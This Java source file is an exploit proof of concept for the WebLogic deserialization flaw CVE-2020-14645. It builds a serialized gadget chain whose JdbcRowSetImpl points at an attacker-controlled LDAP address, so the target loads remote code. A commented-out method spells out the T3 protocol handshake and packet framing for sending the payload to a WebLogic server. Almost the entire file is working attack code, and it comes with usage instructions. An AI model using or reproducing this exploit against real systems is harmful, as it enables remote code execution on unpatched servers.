package com.r17a.weblogic.cve;


import com.sun.rowset.JdbcRowSetImpl;
import com.supeream.serial.Reflections;
import com.supeream.serial.Serializables;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.UniversalExtractor;

import java.util.PriorityQueue;

//https://github.com/DSO-Lab/defvul/blob/master/CVE-2020-14645_Weblogic/src/main/java/com/defvul/Main.java

public class CVE_2020_14654 {

    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.out.println("Usage: java -jar CVE-2020-14645.jar LDAP_IP:LDAP_PORT/#CLASS_NAME WEBLOGIC_URL");
            System.out.println("\nExample: java -jar CVE-2020-14645.jar 1.1.1.1:8080/#exp http://127.0.0.1:7001");
            return;
        }

        // CVE_2020_14645
        UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()", null, 1);
        final ExtractorComparator comparator = new ExtractorComparator(extractor);

        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
        rowSet.setDataSourceName("ldap://" + args[0]);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        Object[] q = new Object[]{rowSet, rowSet};
        Reflections.setFieldValue(queue, "queue", q);
        Reflections.setFieldValue(queue, "size", 2);
        byte[] payload = Serializables.serialize(queue);

//        URL url = new URL(args[1]);
//        send(url.getHost(), url.getPort(), payload, url.getProtocol().equals("https"));
    }

//    public static void send(String host, int port, byte[] payload, boolean isSSL) throws Exception {
//        Socket sock = SocketFactory.newSocket(host, port, isSSL);
//
//        String header = "t3 7.0.0.0\nAS:10\nHL:19\n\n";
//        if (isSSL) {
//            header = "t3s 7.0.0.0\nAS:10\nHL:19\n\n";
//        }
//
//        // Handshake
//        sock.getOutputStream().write(header.getBytes());
//        sock.getOutputStream().flush();
//
//        BufferedReader br = new BufferedReader(new InputStreamReader(sock.getInputStream()));
//        String versionInfo = br.readLine();
//
//        versionInfo = versionInfo.replace("HELO:", "");
//        versionInfo = versionInfo.replace(".false", "");
//        System.out.println("Weblogic version: " + versionInfo);
//
//        // Send Payload
//        //cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1
//
//        //t3 protocol
//        String cmd = "08";
//        String qos = "65";
//        String flags = "01";
//        String responseId = "ffffffff";
//        String invokableId = "ffffffff";
//        String abbrevOffset = "00000000";
//        String countLength = "01";
//        String capacityLength = "10";//必须大于上面设置的AS值
//        String readObjectType = "00";//00 object deserial 01 ascii
//
//        StringBuilder datas = new StringBuilder();
//        datas.append(cmd);
//        datas.append(qos);
//        datas.append(flags);
//        datas.append(responseId);
//        datas.append(invokableId);
//        datas.append(abbrevOffset);
//
//        //because of 2 times deserial
//        countLength = "04";
//        datas.append(countLength);
//
//        //define execute operation
//        String pahse1Str = BytesOperation.bytesToHexString(payload);
//        datas.append(capacityLength);
//        datas.append(readObjectType);
//        datas.append(pahse1Str);
//
//        byte[] headers = BytesOperation.hexStringToBytes(datas.toString());
//        int len = headers.length + 4;
//        String hexLen = Integer.toHexString(len);
//        StringBuilder dataLen = new StringBuilder();
//
//        if (hexLen.length() < 8) {
//            for (int i = 0; i < (8 - hexLen.length()); i++) {
//                dataLen.append("0");
//            }
//        }
//
//        dataLen.append(hexLen);
//        sock.getOutputStream().write(BytesOperation.hexStringToBytes(dataLen + datas.toString()));
//        sock.getOutputStream().flush();
//        sock.close();
//    }
}